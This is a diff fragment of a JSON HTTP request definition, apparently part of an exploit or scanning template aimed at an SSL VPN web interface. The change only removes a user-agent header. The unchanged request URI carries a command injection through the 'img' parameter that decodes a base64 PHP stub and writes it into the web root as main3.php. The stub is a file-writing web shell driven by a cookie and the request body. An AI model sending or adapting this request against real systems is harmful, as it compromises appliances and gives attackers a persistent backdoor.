@@ -5,7 +5,6 @@
       "method": "GET",
       "uri": "/sslvpn/sslvpn_client.php?client=logoImg&img=1267dadalja7o8978d7a797da979sa+||+echo+PD9waHAgZmlsZV9wdXRfY29udGVudHMoJF9DT09LSUVbIm5hbWUiXSxiYXNlNjRfZGVjb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpKSk7Pz4%3d+|base64+-d+|tee+/usr/local/webui/webui/images/basic/login/main3.php||+ls",
       "headers":{
-        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
         "content-type": "application/x-www-form-urlencoded"
       },
       "data": "",
